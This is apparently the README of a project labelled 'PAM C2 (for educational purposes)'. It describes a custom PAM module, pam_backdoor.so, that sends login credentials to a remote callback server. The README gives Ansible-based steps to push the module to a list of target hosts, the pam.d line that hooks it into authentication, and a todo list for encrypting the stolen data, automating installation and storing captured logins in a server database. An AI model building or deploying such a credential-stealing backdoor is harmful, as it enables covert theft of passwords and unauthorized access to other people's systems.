# PAM C2 (for educational purposes) (better name TBD)
Custom PAM module that sends login information to a remote server (built for educational purposes to understand how PAM works on the backend)

## Setup:
1. Write all target IP addresses in inventory.ini under the [targets] section
2. Run ./setup.sh <Callback IP> <Port> as root from the host machine

## Host Requirements and Prerequities:
Host must be a Linux distribution (Debian-based/RedHat-based for now) capable of installing and running Ansible

Install Ansible on the host machine
- Ubuntu: `sudo apt update && sudo apt install software-properties-common && sudo add-apt-repository --yes --update ppa:ansible/ansible && sudo apt install ansible`
- RedHat Distributions: `sudo dnf install ansible`
- Kali Linux: `sudo apt install ansible`

## Current Progress
- Running setup.sh will setup and copy over compiled module to target operating systems into the correct directory (only tested on Ubuntu so far)

## Current Known Issues
- Including the module through `auth optional {PAM_MODULE_DIR}/pam_backdoor.so` before the pam_permit.so line works on sending correct login information to the remote server, but it breaks the login screen for some reason (can still login to the machine through ssh)

## Todo
- Encrypt message being sent from client
- Automate use of module in /etc/pam.d/
- Include a way to authenticate the same way pam_unix.so does
- Create default server-side server with database
- Customizable setup script (output formats, special servers, delivery types)
- Include Arch/SUSE category of target machine (should same as RedHat)